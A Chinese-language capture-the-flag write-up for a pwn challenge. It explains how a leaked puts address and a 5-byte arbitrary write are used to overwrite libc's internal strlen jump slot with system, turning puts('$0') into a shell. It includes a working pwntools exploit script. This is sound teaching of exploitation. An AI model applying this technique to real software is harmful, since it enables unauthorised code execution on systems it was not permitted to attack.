# week1winmt's gift

## 题目简述

程序泄漏 libc 中 `puts` 的地址，并提供一次任意地址写入 5 字节的机会。主程序启用 PIE 和 Full RELRO，自身 GOT 不可写；但随后会执行 `puts("$0")`，可以改写 libc 内部 `puts` 调用的函数指针，把这次调用转为 `system("$0")`。

## 解题过程

先用泄漏的 `puts` 地址减去配套 libc 中的符号偏移，得到 libc 基址。主程序是 Full RELRO，因此不能覆盖主程序 GOT。

程序最后调用 `puts("$0")`。若把执行路径改为 `system("$0")`，`/bin/sh -c` 会展开 `$0` 并启动 shell，因此要寻找 `puts` 内部首次调用且参数寄存器 `rdi` 仍保持为 `"$0"` 的间接函数。

libc 本身也是 ELF，其中的内部跳转槽与主程序 GOT 不是同一处。反汇编配套 libc 的 `puts` 可见它首先经 `j_strlen` 调用 `strlen`；此时 `rdi` 仍指向原字符串。因此把 libc 内部 `strlen` 跳转槽改为 `system`，随后 `puts("$0")` 就会先执行 `system("$0")`。

该版本 libc 中目标槽相对基址的偏移为 `0x1ec0a8`。题目只允许写 5 字节，但两个函数地址位于同一 libc 映射，高位一致，覆盖 `system` 地址的低 5 字节即可；这一前提应在远程配套 libc 上核对。

结合上述流程，可以写出如下 exp：

~~~python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process("./pwn")
io = remote("HOST", PORT)
libc = ELF("./libc.so.6")

io.recvuntil("gift:\n")
libc_base = int(io.recvline().strip(b"\n"), 16) - libc.sym['puts']
success("libc_base:\t" + hex(libc_base))
libc_strlen_got = libc_base + 0x1EC0A8
system_addr = libc_base + libc.sym['system']
io.sendlineafter("address:\n", hex(libc_strlen_got))
io.sendafter("content:\n", p64(system_addr)[:5])
io.interactive()
~~~

## 方法总结

- 核心方法：由泄漏计算 libc 基址，利用任意写把 libc 内部 `strlen` 跳转槽改为 `system`，劫持后续 `puts("$0")`。
- 识别特征：主程序 GOT 因 Full RELRO 不可写，但已知 libc 版本、存在 libc 地址泄漏和有限字节任意写，且后续函数调用的参数可转化为命令。
- 注意事项：内部 GOT 偏移强依赖 libc 版本；必须动态确认 `puts` 的调用顺序、目标页可写以及 5 字节部分覆盖后高位仍正确。
